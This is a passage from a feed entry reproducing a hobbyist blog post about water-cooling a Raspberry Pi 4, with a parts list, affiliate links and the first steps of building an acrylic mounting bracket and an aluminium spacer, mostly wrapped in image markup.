            <pubDate>Mon, 23 Nov 2020 00:51:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Water-cooled Raspberry Pi 4 at 2 GHz]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182414">thread link</a>) | @fortran77
<br/>
November 22, 2020 | https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/ | <a href="https://web.archive.org/web/*/https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-7987" itemscope="" itemtype="http://schema.org/CreativeWork">

	
	<div itemprop="text">
		
<p>Today I’m going to see if I can use a PC water cooling kit to make a water cooled Raspberry Pi 4. I’ve seen a couple of people try this on older model Pi’s, using reducers and adapters to get to a small cooling block onto the CPU, but I’m going to try and make an adapter to fit a larger 30mm cooling block onto a Pi 4.</p>



<p><span data-ez-name="the_diy_life_com-box-3"></span>Just to be clear, this is totally unnecessary and is more of a let’s do it because we can, not because we should type of project.  But we’ll have fun building it anyway, and hopefully it works well in the end!</p>



<p>Here’s a video of the build and the test, read on for the write-up:</p>



<figure><div>
<p><iframe title="Water Cooled Raspberry Pi 4 - Totally Unnecessary, But Pretty Awesome" width="758" height="426" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" data-ezsrc="https://www.youtube.com/embed/fW3VeVe-FJg?feature=oembed"></iframe></p>
</div></figure>



<h2>What You Need For A Water Cooled Raspberry Pi</h2>



<ul><li>Raspberry Pi 4 – <a href="https://amzn.to/3dYeVqg">Buy Here</a></li><li>Pi Power Supply – <a href="https://amzn.to/3jxqMfU">Buy Here</a></li><li>120mm Water Cooling Kit (Not From Amazon) – <a href="https://bit.ly/2ICX64f">Buy Here</a></li><li>240mm Water Cooling Kit (Larger, But From Amazon) – <a href="https://amzn.to/38HForr">Buy Here</a></li><li>CPU Cooling Block (Not From Amazon) – <a href="https://bit.ly/38KIwTb">Buy Here</a></li><li>Adjustable 12V Power Supply – <a href="https://amzn.to/36H6Xyr">Buy Here</a></li></ul>



<p><em>Note: Some of the above parts are affiliate links. By purchasing products through the above links, you’ll be supporting this site, at no additional cost to you.</em></p>



<figure><img data-attachment-id="8006" data-permalink="https://www.the-diy-life.com/pc-water-cooling-kit/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="PC Water Cooling Kit" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1024x576.jpg" alt="PC Water Cooling Kit" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/PC-Water-Cooling-Kit.jpg 1920w"></figure>



<p>I bought a kit that included a 120mm fan and a radiator, a 12V pump, a reservoir and some tubing. These kits are commonly available online for significantly less than the name brand components sold for high-end PCs, but it’s still quite expensive just to mess around with.</p>



<figure><img data-attachment-id="8009" data-permalink="https://www.the-diy-life.com/full-sized-cpu-cooling-water-block/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Full Sized CPU Cooling Water Block" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1024x576.jpg" alt="Full Sized CPU Cooling Water Block" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Sized-CPU-Cooling-Water-Block.jpg 1920w"></figure>



<p>The kit also included a full size CPU cooling block. It looks quite cool (excuse the pun) but is way too big to try and fit onto the Pi, so I’m going to be using one of these smaller 30 x 30mm blocks which can accommodate a half-inch or 12mm tubing.</p>



<figure><img data-attachment-id="8007" data-permalink="https://www.the-diy-life.com/cpu-cooling-water-block/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CPU Cooling Water Block" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1024x576.jpg" alt="CPU Cooling Water Block" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/CPU-Cooling-Water-Block.jpg 1920w"></figure>



<h2>Building The Water Cooled Raspberry Pi 4</h2>



<h3>Mounting The Cooling Block To The Pi</h3>



<p>I’m going to start out by making a bracket to hold the cooling block in place on the Pi over the CPU. </p>



<figure><img data-attachment-id="8010" data-permalink="https://www.the-diy-life.com/designing-a-bracket-to-hold-the-cpu-block/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Designing A Bracket To Hold The CPU Block" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1024x576.jpg" alt="Designing A Bracket To Hold The CPU Block" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Designing-A-Bracket-To-Hold-The-CPU-Block.jpg 1920w"></figure>



<p>We’ll need a square section to locate the block and hold it down onto the CPU and then some legs off to the four mounting holes to hold it in place. I’ve tried to avoid covering the GPIO pins and the major components, the bracket will be quite high up, so won’t interfere with any of the surface mount components.</p>



<figure><img data-attachment-id="8011" data-permalink="https://www.the-diy-life.com/laser-cutting-the-cpu-mounting-bracket/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Laser Cutting The CPU Mounting Bracket" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1024x576.jpg" alt="Laser Cutting The CPU Mounting Bracket" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-CPU-Mounting-Bracket.jpg 1920w"></figure>



<p>I cut the two parts for the bracket out on my laser cutter from 3mm fluorescent green acrylic.</p>



<figure><img data-attachment-id="8012" data-permalink="https://www.the-diy-life.com/gluing-the-retaining-ring-in-place/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Gluing The Retaining Ring In Place" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1024x576.jpg" alt="Gluing The Retaining Ring In Place" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Gluing-The-Retaining-Ring-In-Place.jpg 1920w"></figure>



<p>&nbsp;Then glued the pieces together using some acrylic cement.</p>



<figure><img data-attachment-id="8013" data-permalink="https://www.the-diy-life.com/cooling-water-block-bracket/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Cooling Water Block &amp; Bracket" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1024x576.jpg" alt="Cooling Water Block &amp; Bracket" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Water-Block-Bracket.jpg 1920w"></figure>



<p>Now that we’ve got a bracket to hold the heat sink in place, lets fit it to the Pi.</p>



<figure><img data-attachment-id="7988" data-permalink="https://www.the-diy-life.com/cant-mount-the-block-directly/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Can’t Mount The Block Directly" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1024x576.jpg" alt="Can't Mount The Block Directly" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cant-Mount-The-Block-Directly.jpg 1920w"></figure>



<p>The cooling block can’t be mounted straight onto the CPU as the display connector is too high. We’ll need to put a spacer in between the CPU and cooling block to lift it above the display connector, with enough room for the tubes. </p>



<figure><img data-attachment-id="7989" data-permalink="https://www.the-diy-life.com/cut-a-sqaure-of-aluminium-spacer-block/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Cut A Sqaure Of Aluminium Spacer Block" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1024x576.jpg" alt="Cut A Sqaure Of Aluminium Spacer Block" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cut-A-Sqaure-Of-Aluminium-Spacer-Block.jpg 1920w"></figure>



<p><span data-ez-name="the_diy_life_com-box-4"></span>I’ve cut a section of 4mm aluminium to fit on top of the CPU to space the cooling block away so that it clears the display connector.</p>



<figure><img data-attachment-id="7990" data-permalink="https://www.the-diy-life.com/add-standoffs-for-the-cooling-block/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Add Standoffs For The Cooling Block" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1024x576.jpg" alt="Add Standoffs For The Cooling Block" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-768x432.jpg 